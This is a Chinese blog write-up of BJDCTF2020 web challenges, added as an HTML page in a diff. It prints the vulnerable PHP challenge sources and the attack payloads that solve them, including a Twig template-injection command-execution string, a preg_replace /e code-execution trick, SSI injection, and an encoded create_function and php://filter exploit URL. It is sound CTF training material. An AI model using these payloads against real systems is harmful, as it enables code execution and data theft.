@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>BJDCTF  Web题解 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">BJDCTF  Web题解</h2>
+            <div class="post-date">2020-02-03</div>
+            
+            <div class="post-content">
+              <p><strong>[BJDCTF2020]Mark loves</strong></p>
+<!-- more -->
+<p>扫描目录。发现.git</p>
+<pre><code>&lt;?php
+include 'flag.php';
+$yds = &quot;dog&quot;;
+$is = &quot;cat&quot;;
+$handsome = 'yds';
+foreach($_POST as $x =&gt; $y){
+    $$x = $y;
+}
+foreach($_GET as $x =&gt; $y){
+    $$x = $$y;
+}
+foreach($_GET as $x =&gt; $y){
+    if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){
+        exit($handsome);
+    }
+}
+if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){
+    exit($yds);
+}
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+echo &quot;the flag is: &quot;.$flag;
+</code></pre>
+<p>简单的变量覆盖。<br>
+思路就是覆盖<code>$handsome</code>为<code>$flag</code>。通过exit输出<br>
+这里得通过<code>$_GET</code>进行覆盖。<code>$_POST</code>不存在变量覆盖<br>
+<img src="https://guokeya.github.io/post-images/1580703707162.png" alt="" loading="lazy"><br>
+<strong>[BJDCTF2020]Easy MD5</strong><br>
+在返回头中发现了hint<br>
+<img src="https://guokeya.github.io/post-images/1580703960537.png" alt="" loading="lazy"><br>
+md5函数的漏洞。第二个参数为True。即表示为16位原始二进制格式字符串</p>
+<pre><code>content: ffifdyop
+hex: 276f722736c95d99e921722cf9ed621c
+raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
+string: 'or'6]!r,b
+</code></pre>
+<p>经过解码后27对应'。就造成了注入<br>
+输入ffifdyop进入下一关<br>
+在源代码中发现hint</p>
+<pre><code>$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+</code></pre>
+<p>明显的弱类型比较。<code>a=QNKCDZO&amp;b=240610708</code>绕过</p>
+<pre><code> &lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+} 
+</code></pre>
+<p>不多说了。数组绕过<br>
+<img src="https://guokeya.github.io/post-images/1580704320213.png" alt="" loading="lazy"><br>
+<strong>[BJDCTF2020]The mystery of ip</strong><br>
+flag界面。有ip。尝试xff绕过<br>
+<img src="https://guokeya.github.io/post-images/1580704366654.png" alt="" loading="lazy"><br>
+模板注入。请求头中回显php。应该是twig或者smarty<br>
+<img src="https://guokeya.github.io/post-images/1580704440402.png" alt="" loading="lazy"><br>
+尝试smarty的payload。成功执行<br>
+<img src="https://guokeya.github.io/post-images/1580704511774.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1580704546357.png" alt="" loading="lazy"><br>
+<strong>[BJDCTF2020]ZJCTF，不过如此</strong></p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+$text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;I have a dream&quot;)){
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file)){
+        die(&quot;Not now!&quot;);
+    }
+
+    include($file);  //next.php
+    
+}
+else{
+    highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<p>include伪协议读取next.php</p>
+<pre><code>&lt;?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower(&quot;\\1&quot;)',
+        $str
+    );
+}
+
+
+foreach($_GET as $re =&gt; $str) {
+    echo complex($re, $str). &quot;\n&quot;;
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+</code></pre>
+<p>preg_match代码执行<br>
+<code>\\1=\1代表匹配到的第一个字符,\s</code><br>
+<code>return preg_replace('/(\S* )/ei','strtolower(&quot;\\1&quot;)',$str)</code><br>
+<img src="https://guokeya.github.io/post-images/1580704708887.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1580704947869.png" alt="" loading="lazy"><br>
+<strong>[BJDCTF2020]EasySearch</strong><br>
+index.swp信息泄露</p>
+<pre><code>&lt;?php
+	ob_start();
+	function get_hash(){
+		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';
+		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+		$content = uniqid().$random;
+		return sha1($content); 
+	}
+    header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+	***
+    if(isset($_POST['username']) and $_POST['username'] != '' )
+    {
+        $admin = '6d0bc1';
+        if ( $admin == substr(md5($_POST['password']),0,6)) {
+            echo &quot;&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;&quot;;
+            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
+            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
+            $text = '
+            ***
+            ***
+            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;
+            ***
+			***';
+            fwrite($shtml,$text);
+            fclose($shtml);
+            ***
+			echo &quot;[!] Header  error ...&quot;;
+        } else {
+            echo &quot;&lt;script&gt;alert('[!] Failed')&lt;/script&gt;&quot;;
+            
+    }else
+    {
+	***
+    }
+	***
+?&gt;
+</code></pre>
+<p>将password用md5加密。前6个字符等于6d0bc1<br>
+然后将用户名写入public+随机数+.shtml<br>
+shtml有一个SSI注入可以执行命令<br>
+路径在回显中<br>
+<img src="https://guokeya.github.io/post-images/1580705267817.png" alt="" loading="lazy"><br>
+<strong>[BJDCTF2020]Cookie is so stable</strong><br>
+flag.php要求输入一个字符<br>
+输入后。放在cookie中的user字段。改了admin root都不能读取flag</p>
+<p><img src="https://guokeya.github.io/post-images/1580705357586.png" alt="" loading="lazy"><br>
+<code>{}不能返回结果{{}}可以。返回头存在php，。twig模板注入</code></p>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1580705406126.png" alt="" loading="lazy"></figure>
+<pre><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1580705471713.png" alt="" loading="lazy"><br>
+<strong>[BJDCTF2020]EzPHP</strong><br>
+主页得到hint<code>&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</code><br>
+base32解码后得到1nD3x.php</p>
+<pre><code> &lt;?php
+highlight_file(__FILE__);
+error_reporting(0); 
+
+$file = &quot;1nD3x.php&quot;;
+$shana = $_GET['shana'];
+$passwd = $_GET['passwd'];
+$arg = '';
+$code = '';
+
+echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;
+
+if($_SERVER) { 
+    if (
+        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\'|log/i', $_SERVER['QUERY_STRING'])
+        )  
+        die('You seem to want to do something bad?'); 
+}
+
+if (!preg_match('/http|https/i', $_GET['file'])) {
+    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { 
+        $file = $_GET[&quot;file&quot;]; 
+        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;
+    } 
+} else die('fxck you! What do you want to do ?!');
+
+if($_REQUEST) { 
+    foreach($_REQUEST as $value) { 
+        if(preg_match('/[a-zA-Z]/i', $value))  
+            die('fxck you! I hate English!'); 
+    } 
+} 
+
+if (file_get_contents($file) !== 'debu_debu_aqua')
+    die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);
+
+
+if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){
+    extract($_GET[&quot;flag&quot;]);
+    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;
+} else{
+    die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);
+}
+
+if(preg_match('/^[a-z0-9]*$/isD', $code) || 
+preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
+    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); 
+} else { 
+    include &quot;flag.php&quot;;
+    $code('', $arg); 
+} ?&gt; 
+</code></pre>
+<p>首先绕过第一个判断。</p>
+<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1580718874763.png" alt="" loading="lazy"></figure>
+<p>QUERY_STRING指的是1nD3x.php?后面的字符串。不能包括这些。那么URL编码即可</p>
+<p><img src="https://guokeya.github.io/post-images/1580719073052.png" alt="" loading="lazy"><br>
+接下来。</p>
+<pre><code>$_GET['file']中不能包含http和https。
+$_GET['debu']要以aqua_is_cute开头结尾。但是又不能等于aqua_is_cute
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1580719104529.png" alt="" loading="lazy"><br>
+针对第二个。我们可以用%0a绕过。输入aqua_is_cute%0a<br>
+由于preg_match检测单行字符。%0a表示换行。</p>
+<pre><code>preg_match检测的是
+aqua_is_cute        检测这一行。
+%0a换行
+但是字符串位aqua_is_cute+换行!=aqua_is_cute
+</code></pre>
+<p>再来看第一个判断。这个file要用来干什么<br>
+在后面第二个判断中出现了</p>
+<p><img src="https://guokeya.github.io/post-images/1580719356872.png" alt="" loading="lazy"><br>
+file_get_contents($file)===debu_debu_aqua<br>
+不能使用http和https。而file_get_contents支持php伪协议。这里有php://input和data://两种选择<br>
+再回去看上一个判断</p>
+<p><img src="https://guokeya.github.io/post-images/1580719443029.png" alt="" loading="lazy"><br>
+<code>$_REQUEST</code>的值不能有a-zA-Z。这里用的是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>R</mi></msub><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mi mathvariant="normal">而</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">_REQUEST而不是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span></span></span></span>_GET。所以我们POST和<code>$_GET</code>相同的变量名。值为1即可绕过。这里用了post。那么file_get_contents就不能<code>php://</code>input了<br>
+只能使用data<br>
+接着：sha1数组绕过。</p>
+<p><img src="https://guokeya.github.io/post-images/1580719570316.png" alt="" loading="lazy"><br>
+extract($_GET[flag])<br>
+一个明显的变量覆盖。先放着。继续看</p>
+<p><img src="https://guokeya.github.io/post-images/1580719630184.png" alt="" loading="lazy"><br>
+这里要求<code>$code</code>必须是a-z0-9开头和结尾<br>
+<code>$arg</code>做了过滤</p>
+<pre><code>$code('', $arg);
+明显的create_function代码执行
+$code=create_function
+$arg=}phpinfo();
+</code></pre>
+<p>但是eval。单引号双引号.scandir都被过滤了。不能执行命令。<br>
+接着又包含了f1ag.php<br>
+一般flag.php中flag都是以<code>$flag='flag{fdfd}'</code>存储的<br>
+我们打印下全局变量</p>
+<p><img src="https://guokeya.github.io/post-images/1580720075500.png" alt="" loading="lazy"><br>
+flag在<code>rea1fl4g.php</code>中。<br>
+常用的scandir。readfile。file_get_contents都过滤了。<br>
+那么还有文件包含伪协议读取文件。这里没过滤require<br>
+构造payload。 包含</p>
+<pre><code>}require(get_defined_vars()[_GET][rce]);//
+</code></pre>
+<p>通过全局变量rce来接收参数。放入require函数中<br>
+<code>rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php</code><br>
+这时候</p>
+<pre><code>get_defined_vars()[_GET][rce]
+=
+php://filter/read=convert.base64-encode/resource=rea1fl4g.php
+
+require(get_defined_vars()[_GET][rce]);
+=
+require('php://filter/read=convert.base64-encode/resource=rea1fl4g.php')
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://guokeya.github.io/post-images/1580720593502.png" alt="" loading="lazy"></figure>
+<pre><code>http://b5a169cf-daf9-4f18-90f0-b6316e8bb2c5.node3.buuoj.cn/1nD3x.php?%64%65%62%75=%61%71%75%61_is_c%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f
+POST:%64%65%62%75=1&amp;file=1&amp;rce=1
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1580720615932.png" alt="" loading="lazy"><br>
+当然这里还能用取反来构造字符串。</p>
+<pre><code>require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));//
+代替
+php://filter/read=convert.base64-encode/resource=1flag.php
+</code></pre>
+<p>还能使用fgets来读取。但是$被禁了。这里使用define常量</p>
+<pre><code>define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))；while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/2020-xin-chun-hong-bao-ti-fan-xu-lie-hua-pop-lian/">
+                  <h3 class="post-title">
+                    [2020 新春红包题]反序列化pop链
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
